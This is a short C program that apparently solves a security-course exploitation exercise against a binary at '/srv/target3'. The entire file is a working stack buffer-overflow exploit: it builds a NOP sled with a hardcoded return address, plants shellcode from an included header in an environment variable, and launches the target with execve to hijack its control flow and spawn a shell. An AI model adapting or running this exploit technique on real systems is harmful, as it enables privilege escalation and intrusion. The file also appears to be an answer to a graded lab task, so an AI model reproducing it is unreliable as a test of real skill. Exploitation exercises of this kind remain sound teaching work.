#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target3";

const int ESIZE = 400;
const uint32_t BASE = 0xffffdec0;
const int NSIZE = 201;
const char NOP = 0x90;
const int DIFF = 4;
const uint32_t A1 = BASE + DIFF;
const uint32_t A2 = BASE + 2 * DIFF;

const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
const char* ADD = "\xc0\xde\xff\xff";

char* prepB() {
    char* buf = malloc(strlen(SLED) + strlen(ADD) + 1);
    sprintf(buf, "%s%s", SLED, ADD);
    return buf;
}

void prepE(char *e) {
    memset(e, NOP, ESIZE - 1);
    *((uint32_t *)(e)) = A1;
    *((uint32_t *)(e + DIFF)) = A2;
    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
    e[ESIZE - 1] = '\0';
}

int main(void) {
    char *buf = prepB();
    char *args[] = {TARGET, buf, NULL};
    char env[ESIZE];

    prepE(env);

    char *envp[] = {env};

    execve(TARGET, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
